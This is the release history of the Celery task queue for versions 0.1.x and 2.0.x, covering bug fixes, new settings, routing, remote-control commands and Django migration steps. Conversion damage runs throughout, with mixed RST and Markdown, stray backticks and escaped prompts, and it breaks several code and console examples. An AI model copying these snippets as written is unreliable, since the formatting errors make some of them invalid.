contact us!  .. _version-0.1.14:  0.1.14 ====== :release-date: 2009-05-19 01:08 p.m. CET :release-by: Ask Solem  * Fixed a syntax error in the `TaskSet` class (no such variable   `TimeOutError`).  .. _version-0.1.13:  0.1.13 ====== :release-date: 2009-05-19 12:36 p.m. CET :release-by: Ask Solem  * Forgot to add `yadayada` to install requirements.  * Now deletes all expired task results, not just those marked as done.  * Able to load the Tokyo Tyrant backend class without django   configuration, can specify tyrant settings directly in the class   constructor.  * Improved API documentation  * Now using the Sphinx documentation system, you can build   the html documentation by doing: ``\`console $ cd docs $ make html

</div>

> and the result will be in <span class="title-ref">docs/\_build/html</span>.

<div id="version-0.1.12">

0.1.12 `` ` ====== :release-date: 2009-05-18 04:38 p.m. CET :release-by: Ask Solem  * `delay_task()` etc. now returns `celery.task.AsyncResult` object,   which lets you check the result and any failure that might've   happened. It kind of works like the `multiprocessing.AsyncResult`   class returned by `multiprocessing.Pool.map_async`.  * Added ``dmap()`and`dmap\_async()``. This works like the   `multiprocessing.Pool` versions except they're tasks   distributed to the Celery server. Example:``\`pycon \>\>\> from celery.task import dmap \>\>\> import operator \>\>\> dmap(operator.add, \[\[2, 2\], \[4, 4\], \[8, 8\]\]) \>\>\> \[4, 8, 16\]

</div>

> \>\>\> from celery.task import dmap\_async \>\>\> import operator \>\>\> result = dmap\_async(operator.add, \[\[2, 2\], \[4, 4\], \[8, 8\]\]) \>\>\> result.ready() False \>\>\> time.sleep(1) \>\>\> result.ready() True \>\>\> result.result \[4, 8, 16\]

  - Refactored the task meta-data cache and database backends, and added a new backend for Tokyo Tyrant. You can set the backend in your django settings file.
    
    > Example:
    > 
    > ``` python
    > CELERY_RESULT_BACKEND = 'database'; # Uses the database
    > CELERY_RESULT_BACKEND = 'cache'; # Uses the django cache framework
    > CELERY_RESULT_BACKEND = 'tyrant'; # Uses Tokyo Tyrant
    > TT_HOST = 'localhost'; # Hostname for the Tokyo Tyrant server.
    > TT_PORT = 6657; # Port of the Tokyo Tyrant server.
    > ```

<div id="version-0.1.11">

0.1.11 `` ` ====== :release-date: 2009-05-12 02:08 p.m. CET :release-by: Ask Solem  * The logging system was leaking file descriptors, resulting in   servers stopping with the EMFILES (too many open files) error (fixed).  .. _version-0.1.10:  0.1.10 ====== :release-date: 2009-05-11 12:46 p.m. CET :release-by: Ask Solem  * Tasks now supports both positional arguments and keyword arguments.  * Requires carrot 0.3.8.  * The daemon now tries to reconnect if the connection is lost.  .. _version-0.1.8:  0.1.8 ===== :release-date: 2009-05-07 12:27 p.m. CET :release-by: Ask Solem  * Better test coverage * More documentation * The worker doesn't emit `Queue is empty` message if   `settings.CELERYD_EMPTY_MSG_EMIT_EVERY` is 0.  .. _version-0.1.7:  0.1.7 ===== :release-date: 2009-04-30 01:50 p.m. CET :release-by: Ask Solem  * Added some unit tests  * Can now use the database for task meta-data (like if the task has   been executed or not). Set `settings.CELERY_TASK_META`  * Can now run `python setup.py test` to run the unit tests from   within the `tests` project.  * Can set the AMQP exchange/routing key/queue using   `settings.CELERY_AMQP_EXCHANGE`, `settings.CELERY_AMQP_ROUTING_KEY`,   and `settings.CELERY_AMQP_CONSUMER_QUEUE`.  .. _version-0.1.6:  0.1.6 ===== :release-date: 2009-04-28 02:13 p.m. CET :release-by: Ask Solem  * Introducing `TaskSet`. A set of subtasks is executed and you can   find out how many, or if all them, are done (excellent for progress   bars and such)  * Now catches all exceptions when running `Task.__call__`, so the   daemon doesn't die. This doesn't happen for pure functions yet, only   `Task` classes.  * `autodiscover()` now works with zipped eggs.  * Worker: Now adds current working directory to `sys.path` for   convenience.  * The `run_every` attribute of `PeriodicTask` classes can now be a   `datetime.timedelta()` object.  * Worker: You can now set the `DJANGO_PROJECT_DIR` variable   for the worker and it will add that to `sys.path` for easy launching.  * Can now check if a task has been executed or not via HTTP.  * You can do this by including the Celery `urls.py` into your project,          >>> url(r'^celery/$', include('celery.urls'))    then visiting the following URL: ``\`text <http://mysite/celery/$task_id/done/>

</div>

> this will return a JSON dictionary, for example:
> 
> ``` json
> {"task": {"id": "TASK_ID", "executed": true}}
> ```

  - <span class="title-ref">delay\_task</span> now returns string id, not <span class="title-ref">uuid.UUID</span> instance.
  - Now has <span class="title-ref">PeriodicTasks</span>, to have <span class="title-ref">cron</span> like functionality.
  - Project changed name from <span class="title-ref">crunchy</span> to <span class="title-ref">celery</span>. The details of the name change request is in <span class="title-ref">docs/name\_change\_request.txt</span>.

<div id="version-0.1.0">

0.1.0 \`\`\` ===== :release-date: 2009-04-24 11:28 a.m. CET :release-by: Ask Solem

</div>

  - Initial release

Sphinx started sucking by removing images from \_static, so we need to add them here into actual content to ensure they are included :-(

![image](../images/celery-banner.png)

![image](../images/celery-banner-small.png)

---

changelog-2.0.md

---

# Change history for Celery 2.0

<div class="contents" data-local="">

</div>

## 2.0.3

  - release-date  
    2010-08-27 12:00 p.m. CEST

  - release-by  
    Ask Solem

### Fixes

  - Worker: Properly handle connection errors happening while closing consumers.

  - Worker: Events are now buffered if the connection is down, then sent when the connection is re-established.

  - No longer depends on the `mailer` package.
    
    > This package had a name space collision with <span class="title-ref">django-mailer</span>, so its functionality was replaced.

  - Redis result backend: Documentation typos: Redis doesn't have database names, but database numbers. The default database is now 0.

  - \`\~celery.task.control.inspect\`: <span class="title-ref">registered\_tasks</span> was requesting an invalid command because of a typo.
    
    > See issue \#170.

  - `CELERY_ROUTES`: Values defined in the route should now have precedence over values defined in `CELERY_QUEUES` when merging the two.
    
    > With the follow settings:
    > 
    >   - \`\`\`python
    >     
    >       - CELERY\_QUEUES = {'cpubound': {'exchange': 'cpubound',  
    >         'routing\_key': 'cpubound'}}
    >     
    >       - CELERY\_ROUTES = {'tasks.add': {'queue': 'cpubound',  
    >         'routing\_key': 'tasks.add', 'serializer': 'json'}}
    > 
    > The final routing options for <span class="title-ref">tasks.add</span> will become:
    > 
    > ``` python
    > {'exchange': 'cpubound',
    >  'routing_key': 'tasks.add',
    >  'serializer': 'json'}
    > ```
    > 
    > This wasn't the case before: the values in `CELERY_QUEUES` would take precedence.

  - Worker crashed if the value of `CELERY_TASK_ERROR_WHITELIST` was not an iterable

  - \`\~celery.execute.apply\`: Make sure <span class="title-ref">kwargs\['task\_id'\]</span> is always set.

  - \`AsyncResult.traceback\`: Now returns <span class="title-ref">None</span>, instead of raising <span class="title-ref">KeyError</span> if traceback is missing.

  - \`\~celery.task.control.inspect\`: Replies didn't work correctly if no destination was specified.

  - Can now store result/meta-data for custom states.

  - Worker: A warning is now emitted if the sending of task error emails fails.

  - `celeryev`: Curses monitor no longer crashes if the terminal window is resized.
    
    > See issue \#160.

  - Worker: On macOS it isn't possible to run <span class="title-ref">os.exec\*</span> in a process that's threaded.
    
    > This breaks the SIGHUP restart handler, and is now disabled on macOS, emitting a warning instead.
    > 
    > See issue \#152.

  - `celery.execute.trace`: Properly handle <span class="title-ref">raise(str)</span>, which is still allowed in Python 2.4.
    
    > See issue \#175.

  - Using urllib2 in a periodic task on macOS crashed because of the proxy auto detection used in macOS.
    
    > This is now fixed by using a workaround. See issue \#143.

  - Debian init-scripts: Commands shouldn't run in a sub shell
    
    > See issue \#163.

  - Debian init-scripts: Use the absolute path of `celeryd` program to allow stat
    
    > See issue \#162.

<div id="v203-documentation">

Documentation `` ` -------------  * getting-started/broker-installation: Fixed typo      `set_permissions ""` -> `set_permissions ".*"`.  * Tasks User Guide: Added section on database transactions.      See issue #169.  * Routing User Guide: Fixed typo `"feed": -> {"queue": "feeds"}`.      See issue #169.  * Documented the default values for the :setting:`CELERYD_CONCURRENCY`   and :setting:`CELERYD_PREFETCH_MULTIPLIER` settings.  * Tasks User Guide: Fixed typos in the subtask example  * celery.signals: Documented worker_process_init.  * Daemonization cookbook: Need to export DJANGO_SETTINGS_MODULE in   `/etc/default/celeryd`.  * Added some more FAQs from stack overflow  * Daemonization cookbook: Fixed typo `CELERYD_LOGFILE/CELERYD_PIDFILE`      to `CELERYD_LOG_FILE` / `CELERYD_PID_FILE`      Also added troubleshooting section for the init-scripts.  .. _version-2.0.2:  2.0.2 ===== :release-date: 2010-07-22 11:31 a.m. CEST :release-by: Ask Solem  * Routes: When using the dict route syntax, the exchange for a task   could disappear making the task unroutable.      See issue #158.  * Test suite now passing on Python 2.4  * No longer have to type `PYTHONPATH=.` to use ``celeryconfig``in the current   directory.      This is accomplished by the default loader ensuring that the current     directory is in `sys.path` when loading the config module.     `sys.path` is reset to its original state after loading.      Adding the current working directory to `sys.path` without the user     knowing may be a security issue, as this means someone can drop a Python module in the users     directory that executes arbitrary commands. This was the original reason     not to do this, but if done *only when loading the config module*, this     means that the behavior will only apply to the modules imported in the     config module, which I think is a good compromise (certainly better than     just explicitly setting `PYTHONPATH=.` anyway)  * Experimental Cassandra backend added.  * Worker: SIGHUP handler accidentally propagated to worker pool processes.      In combination with :sha:`7a7c44e39344789f11b5346e9cc8340f5fe4846c`     this would make each child process start a new worker instance when     the terminal window was closed :/  * Worker: Don't install SIGHUP handler if running from a terminal.      This fixes the problem where the worker is launched in the background     when closing the terminal.  * Worker: Now joins threads at shutdown.      See issue #152.  * Test tear down: Don't use `atexit` but nose's `teardown()` functionality   instead.      See issue #154.  * Debian worker init-script: Stop now works correctly.  * Task logger: `warn` method added (synonym for `warning`)  * Can now define a white list of errors to send error emails for.      Example:``\`python CELERY\_TASK\_ERROR\_WHITELIST = ('myapp.MalformedInputError',)

</div>

> See issue \#153.

  - Worker: Now handles overflow exceptions in <span class="title-ref">time.mktime</span> while parsing the ETA field.

  - LoggerWrapper: Try to detect loggers logging back to stderr/stdout making an infinite loop.

  - Added \`celery.task.control.inspect\`: Inspects a running worker.
    
    > Examples:
    > 
    > ``` pycon
    > # Inspect a single worker
    > >>> i = inspect('myworker.example.com')
    > 
    > # Inspect several workers
    > >>> i = inspect(['myworker.example.com', 'myworker2.example.com'])
    > 
    > # Inspect all workers consuming on this vhost.
    > >>> i = inspect()
    > 
    > ### Methods
    > 
    > # Get currently executing tasks
    > >>> i.active()
    > 
    > # Get currently reserved tasks
    > >>> i.reserved()
    > 
    > # Get the current ETA schedule
    > >>> i.scheduled()
    > 
    > # Worker statistics and info
    > >>> i.stats()
    > 
    > # List of currently revoked tasks
    > >>> i.revoked()
    > 
    > # List of registered tasks
    > >>> i.registered_tasks()
    > ```

  - Remote control commands <span class="title-ref">dump\_active</span>/<span class="title-ref">dump\_reserved</span>/<span class="title-ref">dump\_schedule</span> now replies with detailed task requests.
    
    > Containing the original arguments and fields of the task requested.
    > 
    > In addition the remote control command <span class="title-ref">set\_loglevel</span> has been added, this only changes the log level for the main process.

  - Worker control command execution now catches errors and returns their string representation in the reply.

  - Functional test suite added
    
    > `celery.tests.functional.case` contains utilities to start and stop an embedded worker process, for use in functional testing.

<div id="version-2.0.1">

2.0.1 `` ` ===== :release-date: 2010-07-09 03:02 p.m. CEST :release-by: Ask Solem  * multiprocessing.pool: Now handles encoding errors, so that pickling errors   doesn't crash the worker processes.  * The remote control command replies wasn't working with RabbitMQ 1.8.0's   stricter equivalence checks.      If you've already hit this problem you may have to delete the     declaration: ``\`console $ camqadm exchange.delete celerycrq

</div>

> or:
> 
> ``` console
> $ python manage.py camqadm exchange.delete celerycrq
> ```

  - A bug sneaked in the ETA scheduler that made it only able to execute one task per second(\!)
    
    > The scheduler sleeps between iterations so it doesn't consume too much CPU. It keeps a list of the scheduled items sorted by time, at each iteration it sleeps for the remaining time of the item with the nearest deadline. If there are no ETA tasks it will sleep for a minimum amount of time, one second by default.
    > 
    > A bug sneaked in here, making it sleep for one second for every task that was scheduled. This has been fixed, so now it should move tasks like hot knife through butter.
    > 
    > In addition a new setting has been added to control the minimum sleep interval; `CELERYD_ETA_SCHEDULER_PRECISION`. A good value for this would be a float between 0 and 1, depending on the needed precision. A value of 0.8 means that when the ETA of a task is met, it will take at most 0.8 seconds for the task to be moved to the ready queue.

  - Pool: Supervisor didn't release the semaphore.
    
    > This would lead to a deadlock if all workers terminated prematurely.

  - Added Python version trove classifiers: 2.4, 2.5, 2.6 and 2.7

  - Tests now passing on Python 2.7.

  - Task.\_\_reduce\_\_: Tasks created using the task decorator can now be pickled.

  - `setup.py`: `nose` added to <span class="title-ref">tests\_require</span>.

  - Pickle should now work with SQLAlchemy 0.5.x

  - New homepage design by Jan Henrik Helmers: <http://celeryproject.org>

  - New Sphinx theme by Armin Ronacher: <https://docs.celeryq.dev/>

  - Fixed "pending\_xref" errors shown in the HTML rendering of the documentation. Apparently this was caused by new changes in Sphinx 1.0b2.

  - Router classes in `CELERY_ROUTES` are now imported lazily.
    
    > Importing a router class in a module that also loads the Celery environment would cause a circular dependency. This is solved by importing it when needed after the environment is set up.

  - `CELERY_ROUTES` was broken if set to a single dict.
    
    > This example in the docs should now work again:
    > 
    > ``` python
    > CELERY_ROUTES = {'feed.tasks.import_feed': 'feeds'}
    > ```

  - <span class="title-ref">CREATE\_MISSING\_QUEUES</span> wasn't honored by apply\_async.

  - New remote control command: <span class="title-ref">stats</span>
    
    > Dumps information about the worker, like pool process ids, and total number of tasks executed by type.
    > 
    > Example reply:
    > 
    > ``` python
    > [{'worker.local':
    >      'total': {'tasks.sleeptask': 6},
    >      'pool': {'timeouts': [None, None],
    >               'processes': [60376, 60377],
    >               'max-concurrency': 2,
    >               'max-tasks-per-child': None,
    >               'put-guarded-by-semaphore': True}}]
    > ```

  - New remote control command: <span class="title-ref">dump\_active</span>
    
    > Gives a list of tasks currently being executed by the worker. By default arguments are passed through repr in case there are arguments that's not JSON encodable. If you know the arguments are JSON safe, you can pass the argument <span class="title-ref">safe=True</span>.
    > 
    > Example reply:
    > 
    > ``` pycon
    > >>> broadcast('dump_active', arguments={'safe': False}, reply=True)
    > [{'worker.local': [
    >     {'args': '(1,)',
    >      'time_start': 1278580542.6300001,
    >      'name': 'tasks.sleeptask',
    >      'delivery_info': {
    >          'consumer_tag': '30',
    >          'routing_key': 'celery',
    >          'exchange': 'celery'},
    >      'hostname': 'casper.local',
    >      'acknowledged': True,
    >      'kwargs': '{}',
    >      'id': '802e93e9-e470-47ed-b913-06de8510aca2',
    >     }
    > ]}]
    > ```

  - Added experimental support for persistent revokes.
    
    > Use the <span class="title-ref">-S|--statedb</span> argument to the worker to enable it:
    > 
    > ``` console
    > $ celeryd --statedb=/var/run/celeryd
    > ```
    > 
    > This will use the file: <span class="title-ref">/var/run/celeryd.db</span>, as the <span class="title-ref">shelve</span> module automatically adds the <span class="title-ref">.db</span> suffix.

<div id="version-2.0.0">

2.0.0 `` ` ===== :release-date: 2010-07-02 02:30 p.m. CEST :release-by: Ask Solem  Foreword --------  Celery 2.0 contains backward incompatible changes, the most important being that the Django dependency has been removed so Celery no longer supports Django out of the box, but instead as an add-on package called :pypi:`django-celery`.  We're very sorry for breaking backwards compatibility, but there's also many new and exciting features to make up for the time you lose upgrading, so be sure to read the [News <v200-news>](#news-<v200-news>) section.  Quite a lot of potential users have been upset about the Django dependency, so maybe this is a chance to get wider adoption by the Python community as well.  Big thanks to all contributors, testers and users!  .. _v200-django-upgrade:  Upgrading for Django-users --------------------------  Django integration has been moved to a separate package: :pypi:`django-celery`.  * To upgrade you need to install the :pypi:`django-celery` module and change: ``\`python INSTALLED\_APPS = 'celery'

</div>

> to:
> 
> ``` python
> INSTALLED_APPS = 'djcelery'
> ```

  - If you use <span class="title-ref">mod\_wsgi</span> you need to add the following line to your <span class="title-ref">.wsgi</span> file:
    
    > 
    > 
    > ``` python
    > import os
    > os.environ['CELERY_LOADER'] = 'django'
    > ```

  - The following modules has been moved to `django-celery`:
    
    > 
    > 
    > | **Module name**                                         | **Replace with**                                          |
    > | ------------------------------------------------------- | --------------------------------------------------------- |
    > | <span class="title-ref">celery.models</span>            | <span class="title-ref">djcelery.models</span>            |
    > | <span class="title-ref">celery.managers</span>          | <span class="title-ref">djcelery.managers</span>          |
    > | <span class="title-ref">celery.views</span>             | <span class="title-ref">djcelery.views</span>             |
    > | <span class="title-ref">celery.urls</span>              | <span class="title-ref">djcelery.urls</span>              |
    > | <span class="title-ref">celery.management</span>        | <span class="title-ref">djcelery.management</span>        |
    > | <span class="title-ref">celery.loaders.djangoapp</span> | <span class="title-ref">djcelery.loaders</span>           |
    > | <span class="title-ref">celery.backends.database</span> | <span class="title-ref">djcelery.backends.database</span> |
    > | <span class="title-ref">celery.backends.cache</span>    | <span class="title-ref">djcelery.backends.cache</span>    |
    > 

Importing `djcelery` will automatically setup Celery to use Django loader. `` ` loader. It does this by setting the :envvar:`CELERY_LOADER` environment variable to `"django"` (it won't change it if a loader is already set).  When the Django loader is used, the "database" and "cache" result backend aliases will point to the :mod:`djcelery` backends instead of the built-in backends, and configuration will be read from the Django settings.  .. _v200-upgrade:  Upgrading for others --------------------  .. _v200-upgrade-database:  Database result backend ~~~~~~~~~~~~~~~~~~~~~~~  The database result backend is now using `SQLAlchemy`_ instead of the Django ORM, see `Supported Databases`_ for a table of supported databases.  The `DATABASE_*` settings has been replaced by a single setting: :setting:`CELERY_RESULT_DBURI`. The value here should be an `SQLAlchemy Connection String`_, some examples include: ``\`python \# sqlite (filename) CELERY\_RESULT\_DBURI = 'sqlite:///celerydb.sqlite'

> \# mysql CELERY\_RESULT\_DBURI = 'mysql://scott:<tiger@localhost/foo>'
> 
> \# postgresql CELERY\_RESULT\_DBURI = 'postgresql://scott:<tiger@localhost/mydatabase>'
> 
> \# oracle CELERY\_RESULT\_DBURI = 'oracle://scott:<tiger@127.0.0.1>:1521/sidname'

See [SQLAlchemy Connection Strings]() for more information about connection `` ` strings.  To specify additional SQLAlchemy database engine options you can use the :setting:`CELERY_RESULT_ENGINE_OPTIONS` setting: ``\`python \# echo enables verbose logging from SQLAlchemy. CELERY\_RESULT\_ENGINE\_OPTIONS = {'echo': True}

  - `` ` .. _`Supported Databases`:     http://www.sqlalchemy.org/docs/core/engines.html#supported-databases .. _`SQLAlchemy Connection String`:     http://www.sqlalchemy.org/docs/core/engines.html#database-urls .. _`SQLAlchemy Connection Strings`:     http://www.sqlalchemy.org/docs/core/engines.html#database-urls  .. _v200-upgrade-cache:  Cache result backend ~~~~~~~~~~~~~~~~~~~~  The cache result backend is no longer using the Django cache framework, but it supports mostly the same configuration syntax: ``\`python  
    CELERY\_CACHE\_BACKEND = 'memcached://A.example.com:11211;B.example.com'

To use the cache backend you must either have the `pylibmc` or `` ` :pypi:`python-memcached` library installed, of which the former is regarded as the best choice.  The support backend types are `memcached://` and `memory://`, we haven't felt the need to support any of the other backends provided by Django.  .. _v200-incompatible:  Backward incompatible changes -----------------------------  * Default (python) loader now prints warning on missing `celeryconfig.py`   instead of raising `ImportError`.      The worker raises `~@ImproperlyConfigured` if the configuration     isn't set up. This makes it possible to use `--help` etc., without having a     working configuration.      Also this makes it possible to use the client side of Celery without being     configured: ``\`pycon \>\>\> from carrot.connection import BrokerConnection \>\>\> conn = BrokerConnection('localhost', 'guest', 'guest', '/') \>\>\> from celery.execute import send\_task \>\>\> r = send\_task('celery.ping', args=(), kwargs={}, connection=conn) \>\>\> from celery.backends.amqp import AMQPBackend \>\>\> r.backend = AMQPBackend(connection=conn) \>\>\> r.get() 'pong'

  - The following deprecated settings has been removed (as scheduled by the \[deprecation-timeline\](\#deprecation-timeline)):
    
    > 
    > 
    > | **Setting name**                                                     | **Replace with**                                               |
    > | -------------------------------------------------------------------- | -------------------------------------------------------------- |
    > | <span class="title-ref">CELERY\_AMQP\_CONSUMER\_QUEUES</span>        | <span class="title-ref">CELERY\_QUEUES</span>                  |
    > | <span class="title-ref">CELERY\_AMQP\_EXCHANGE</span>                | <span class="title-ref">CELERY\_DEFAULT\_EXCHANGE</span>       |
    > | <span class="title-ref">CELERY\_AMQP\_EXCHANGE\_TYPE</span>          | <span class="title-ref">CELERY\_DEFAULT\_EXCHANGE\_TYPE</span> |
    > | <span class="title-ref">CELERY\_AMQP\_CONSUMER\_ROUTING\_KEY</span>  | <span class="title-ref">CELERY\_QUEUES</span>                  |
    > | <span class="title-ref">CELERY\_AMQP\_PUBLISHER\_ROUTING\_KEY</span> | <span class="title-ref">CELERY\_DEFAULT\_ROUTING\_KEY</span>   |
    > 

  - The <span class="title-ref">celery.task.rest</span> module has been removed, use <span class="title-ref">celery.task.http</span> instead (as scheduled by the \[deprecation-timeline\](\#deprecation-timeline)).

  - It's no longer allowed to skip the class name in loader names. (as scheduled by the \[deprecation-timeline\](\#deprecation-timeline)):
    
    > Assuming the implicit <span class="title-ref">Loader</span> class name is no longer supported, for example, if you use:
    > 
    > ``` python
    > CELERY_LOADER = 'myapp.loaders'
    > ```
    > 
    > You need to include the loader class name, like this:
    > 
    > ``` python
    > CELERY_LOADER = 'myapp.loaders.Loader'
    > ```

  - `CELERY_TASK_RESULT_EXPIRES` now defaults to 1 day.
    
    > Previous default setting was to expire in 5 days.

  - AMQP backend: Don't use different values for <span class="title-ref">auto\_delete</span>.
    
    > This bug became visible with RabbitMQ 1.8.0, which no longer allows conflicting declarations for the auto\_delete and durable settings.
    > 
    > If you've already used Celery with this backend chances are you have to delete the previous declaration:
    > 
    > ``` console
    > $ camqadm exchange.delete celeryresults
    > ```

  - Now uses pickle instead of cPickle on Python versions \<= 2.5
    
    > cPickle is broken in Python \<= 2.5.
    > 
    > It unsafely and incorrectly uses relative instead of absolute imports, so for example:
    > 
    > ``` python
    > exceptions.KeyError
    > ```
    > 
    > becomes:
    > 
    > ``` python
    > celery.exceptions.KeyError
    > ```
    > 
    > Your best choice is to upgrade to Python 2.6, as while the pure pickle version has worse performance, it is the only safe option for older Python versions.

<div id="v200-news">

News `` ` ----  * **celeryev**: Curses Celery Monitor and Event Viewer.      This is a simple monitor allowing you to see what tasks are     executing in real-time and investigate tracebacks and results of ready     tasks. It also enables you to set new rate limits and revoke tasks.      Screenshot:      .. figure:: ../images/celeryevshotsm.jpg      If you run `celeryev` with the `-d` switch it will act as an event     dumper, simply dumping the events it receives to standard out: ``\`console $ celeryev -d -\> celeryev: starting capture... casper.local \[2010-06-04 10:42:07.020000\] heartbeat casper.local \[2010-06-04 10:42:14.750000\] task received: tasks.add(61a68756-27f4-4879-b816-3cf815672b0e) args=\[2, 2\] kwargs={} eta=2010-06-04T10:42:16.669290, retries=0 casper.local \[2010-06-04 10:42:17.230000\] task started tasks.add(61a68756-27f4-4879-b816-3cf815672b0e) args=\[2, 2\] kwargs={} casper.local \[2010-06-04 10:42:17.960000\] task succeeded: tasks.add(61a68756-27f4-4879-b816-3cf815672b0e) args=\[2, 2\] kwargs={} result=4, runtime=0.782663106918

</div>

> The fields here are, in order: *sender hostname*, *timestamp*, *event type* and *additional event fields*.

  - AMQP result backend: Now supports <span class="title-ref">.ready()</span>, <span class="title-ref">.successful()</span>, <span class="title-ref">.result</span>, <span class="title-ref">.status</span>, and even responds to changes in task state

  - New user guides:
    
    >   - \[guide-workers\](\#guide-workers)
    >   - \[guide-canvas\](\#guide-canvas)
    >   - \[guide-routing\](\#guide-routing)

  - Worker: Standard out/error is now being redirected to the log file.

  - `billiard` has been moved back to the Celery repository.
    
    > 
    > 
    > | **Module name**                                          | **celery equivalent**                                            |
    > | -------------------------------------------------------- | ---------------------------------------------------------------- |
    > | <span class="title-ref">billiard.pool</span>             | <span class="title-ref">celery.concurrency.processes.pool</span> |
    > | <span class="title-ref">billiard.serialization</span>    | <span class="title-ref">celery.serialization</span>              |
    > | <span class="title-ref">billiard.utils.functional</span> | <span class="title-ref">celery.utils.functional</span>           |
    > 

    > The `billiard` distribution may be maintained, depending on interest.

  - now depends on `carrot` \>= 0.10.5

  - now depends on `pyparsing`

  - Worker: Added <span class="title-ref">--purge</span> as an alias to <span class="title-ref">--discard</span>.

  - Worker: `Control-c` (SIGINT) once does warm shutdown, hitting `Control-c` twice forces termination.

  - Added support for using complex Crontab-expressions in periodic tasks. For example, you can now use:
    
    > 
    > 
    > ``` pycon
    > >>> crontab(minute='*/15')
    > ```
    > 
    > or even:
    > 
    > ``` pycon
    > >>> crontab(minute='*/30', hour='8-17,1-2', day_of_week='thu-fri')
    > ```
    
    See \[guide-beat\](\#guide-beat).

  - Worker: Now waits for available pool processes before applying new tasks to the pool.
    
    > This means it doesn't have to wait for dozens of tasks to finish at shutdown because it has applied prefetched tasks without having any pool processes available to immediately accept them.
    > 
    > See issue \#122.

  - New built-in way to do task callbacks using <span class="title-ref">\~celery.subtask</span>.
    
    See \[guide-canvas\](\#guide-canvas) for more information.

  - TaskSets can now contain several types of tasks.
    
    <span class="title-ref">\~celery.task.sets.TaskSet</span> has been refactored to use a new syntax, please see \[guide-canvas\](\#guide-canvas) for more information.
    
    The previous syntax is still supported, but will be deprecated in version 1.4.

  - TaskSet failed() result was incorrect.
    
    > See issue \#132.

  - Now creates different loggers per task class.
    
    > See issue \#129.

  - Missing queue definitions are now created automatically.
    
    > You can disable this using the `CELERY_CREATE_MISSING_QUEUES` setting.
    > 
    > The missing queues are created with the following options:
    > 
    > ``` python
    > CELERY_QUEUES[name] = {'exchange': name,
    >                        'exchange_type': 'direct',
    >                        'routing_key': 'name}
    > ```
    > 
    > This feature is added for easily setting up routing using the <span class="title-ref">-Q</span> option to the worker:
    > 
    > ``` console
    > $ celeryd -Q video, image
    > ```
    > 
    > See the new routing section of the User Guide for more information: \[guide-routing\](\#guide-routing).

  - New Task option: <span class="title-ref">Task.queue</span>
    
    > If set, message options will be taken from the corresponding entry in `CELERY_QUEUES`. <span class="title-ref">exchange</span>, <span class="title-ref">exchange\_type</span> and <span class="title-ref">routing\_key</span> will be ignored

  - Added support for task soft and hard time limits.
    
    > New settings added:
    > 
    >   - `CELERYD_TASK_TIME_LIMIT`
    >     
    >     > Hard time limit. The worker processing the task will be killed and replaced with a new one when this is exceeded.
    > 
    >   - `CELERYD_TASK_SOFT_TIME_LIMIT`
    >     
    >     > Soft time limit. The <span class="title-ref">\~@SoftTimeLimitExceeded</span> exception will be raised when this is exceeded. The task can catch this to, for example, clean up before the hard time limit comes.
    > 
    > New command-line arguments to `celeryd` added: <span class="title-ref">--time-limit</span> and <span class="title-ref">--soft-time-limit</span>.
    > 
    > What's left?
    > 
    > This won't work on platforms not supporting signals (and specifically the <span class="title-ref">SIGUSR1</span> signal) yet. So an alternative the ability to disable the feature all together on nonconforming platforms must be implemented.
    > 
    > Also when the hard time limit is exceeded, the task result should be a <span class="title-ref">TimeLimitExceeded</span> exception.

  - Test suite is now passing without a running broker, using the carrot in-memory backend.

  - Log output is now available in colors.
    
    > 
    > 
    > | **Log level**                           | **Color** |
    > | --------------------------------------- | --------- |
    > | <span class="title-ref">DEBUG</span>    | Blue      |
    > | <span class="title-ref">WARNING</span>  | Yellow    |
    > | <span class="title-ref">CRITICAL</span> | Magenta   |
    > | <span class="title-ref">ERROR</span>    | Red       |
    > 

    > This is only enabled when the log output is a tty. You can explicitly enable/disable this feature using the `CELERYD_LOG_COLOR` setting.

  - Added support for task router classes (like the django multi-db routers)
    
    >   - New setting: `CELERY_ROUTES`
    > 
    > This is a single, or a list of routers to traverse when sending tasks. Dictionaries in this list converts to a <span class="title-ref">celery.routes.MapRoute</span> instance.
    > 
    > Examples:
    > 
    > >   - \>\>\> CELERY\_ROUTES = {'celery.ping': 'default',  
    > >     'mytasks.add': 'cpu-bound', 'video.encode': { 'queue': 'video', 'exchange': 'media' 'routing\_key': 'media.video.encode'}}
    > > 
    > >   - \>\>\> CELERY\_ROUTES = ('myapp.tasks.Router',  
    > >     {'celery.ping': 'default'})
    > 
    > Where <span class="title-ref">myapp.tasks.Router</span> could be:
    > 
    > ``` python
    > class Router(object):
    > 
    >     def route_for_task(self, task, args=None, kwargs=None):
    >         if task == 'celery.ping':
    >             return 'default'
    > ```
    > 
    > route\_for\_task may return a string or a dict. A string then means it's a queue name in `CELERY_QUEUES`, a dict means it's a custom route.
    > 
    > When sending tasks, the routers are consulted in order. The first router that doesn't return <span class="title-ref">None</span> is the route to use. The message options is then merged with the found route settings, where the routers settings have priority.
    > 
    > Example if <span class="title-ref">\~celery.execute.apply\_async</span> has these arguments:
    > 
    > ``` pycon
    > >>> Task.apply_async(immediate=False, exchange='video',
    > ...                  routing_key='video.compress')
    > ```
    > 
    > and a router returns:
    > 
    > ``` python
    > {'immediate': True,
    >  'exchange': 'urgent'}
    > ```
    > 
    > the final message options will be:
    > 
    > ``` pycon
    > >>> task.apply_async(
    > ...    immediate=True,
    > ...    exchange='urgent',
    > ...    routing_key='video.compress',
    > ... )
    > ```
    > 
    > (and any default message options defined in the <span class="title-ref">\~celery.task.base.Task</span> class)

  - New Task handler called after the task returns: <span class="title-ref">\~celery.task.base.Task.after\_return</span>.

  -   - <span class="title-ref">\~billiard.einfo.ExceptionInfo</span> now passed to  
        <span class="title-ref">\~celery.task.base.Task.on\_retry</span>/ <span class="title-ref">\~celery.task.base.Task.on\_failure</span> as `einfo` keyword argument.

  - Worker: Added `CELERYD_MAX_TASKS_PER_CHILD` / `celery worker --maxtasksperchild`.
    
    > Defines the maximum number of tasks a pool worker can process before the process is terminated and replaced by a new one.

  - Revoked tasks now marked with state `REVOKED`, and <span class="title-ref">result.get()</span> will now raise <span class="title-ref">\~@TaskRevokedError</span>.

  - <span class="title-ref">celery.task.control.ping</span> now works as expected.

  - <span class="title-ref">apply(throw=True)</span> / `CELERY_EAGER_PROPAGATES_EXCEPTIONS`: Makes eager execution re-raise task errors.

  - New signal: `~celery.signals.worker_process_init`: Sent inside the pool worker process at init.

  - Worker: `celery worker -Q` option: Ability to specify list of queues to use, disabling other configured queues.
    
